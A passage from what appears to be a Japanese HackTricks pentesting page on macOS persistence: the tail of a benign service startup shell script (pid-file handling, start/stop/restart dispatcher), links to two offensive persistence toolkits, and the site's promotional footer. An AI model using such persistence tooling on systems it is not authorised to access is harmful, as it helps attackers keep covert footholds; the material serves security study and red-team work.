if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 永続性技術とツール

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksにあなたの会社を広告したいですか？** または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたいですか？** [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**に**フォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
